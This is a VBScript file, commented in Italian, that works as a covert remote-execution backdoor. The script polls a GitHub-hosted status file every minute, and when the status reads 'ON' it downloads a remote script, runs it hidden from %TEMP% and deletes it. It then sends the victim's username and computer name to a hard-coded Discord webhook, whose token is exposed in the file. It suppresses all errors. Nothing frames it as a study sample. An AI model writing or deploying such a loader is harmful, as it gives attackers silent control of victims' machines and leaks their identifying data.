Option Explicit
On Error Resume Next

Dim shell, fso, xmlHttp
Dim urlStatus, urlPayload, webhookURL
Dim statusContent, payloadContent, jsonPayload
Dim tempScriptPath, fileTemp
Dim giaEseguito ' Variabile per tracciare l'esecuzione
Dim net, userName, computerName

' --- CONFIGURAZIONE ---
urlStatus  = "https://raw.githubusercontent.com/StangaSquola/ProvaControlloRemoto/main/status.txt"
urlPayload = "https://raw.githubusercontent.com/StangaSquola/ProvaControlloRemoto/main/script.txt"
webhookURL = "https://discord.com/api/webhooks/1460284227387129937/HqG5d1g8yhgc5SGDILAwme1WJSNCke31QsznnmvccjMuQaJqV4i1KFDXvV641lGCgbB8"

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Set net = CreateObject("WScript.Network")

' Inizialmente impostiamo che non è stato ancora eseguito nulla
giaEseguito = False

' --- LOOP DI CONTROLLO ---
Do
    ' 1. Controlla lo stato
    xmlHttp.Open "GET", urlStatus, False
    xmlHttp.SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
    xmlHttp.Send

    If xmlHttp.Status = 200 Then
        statusContent = UCase(Trim(xmlHttp.responseText))
        statusContent = Replace(statusContent, vbCr, "")
        statusContent = Replace(statusContent, vbLf, "")
        
        ' --- LOGICA ONE-SHOT ---
        If InStr(statusContent, "ON") > 0 Then
            ' Esegue solo se NON è stato già eseguito durante questo periodo di "ON"
            If Not giaEseguito Then
                
                ' 2. Scarica il payload
                xmlHttp.Open "GET", urlPayload, False
                xmlHttp.SetRequestHeader "If-Modified-Since", "Sat, 1 Jan 2000 00:00:00 GMT"
                xmlHttp.Send
                
                If xmlHttp.Status = 200 Then
                    payloadContent = xmlHttp.responseText
                    tempScriptPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\task_remoto.vbs"
                    
                    Set fileTemp = fso.CreateTextFile(tempScriptPath, True)
                    fileTemp.Write payloadContent
                    fileTemp.Close
                    
                    ' 3. Esegue il payload (attende la fine con True)
                    shell.Run "wscript.exe """ & tempScriptPath & """", 0, True
                    
                    If fso.FileExists(tempScriptPath) Then fso.DeleteFile tempScriptPath
                    
                    ' --- 4. INVIA WEBHOOK (Notifica esecuzione avvenuta) ---
                    userName = net.UserName
                    computerName = net.ComputerName
                    
                    ' Costruisce il JSON. Nota: le virgolette interne sono raddoppiate
                    jsonPayload = "{""content"": ""⚠️ **ACTIVATION DETECTED**\n\nIl client **" & userName & "** su **" & computerName & "** ha rilevato lo stato ON e ha eseguito il payload correttamente.""}"
                    
                    xmlHttp.Open "POST", webhookURL, False
                    xmlHttp.setRequestHeader "Content-Type", "application/json"
                    xmlHttp.Send jsonPayload
                    ' -------------------------------------------------------

                    ' Segna come eseguito per non ripeterlo all'infinito
                    giaEseguito = True
                End If
            End If
        Else
            ' Se lo stato è OFF (o comunque non ON), resetta la flag
            ' Così al prossimo "ON" lo script potrà correre di nuovo
            giaEseguito = False
        End If
    End If

    WScript.Sleep 60000
Loop
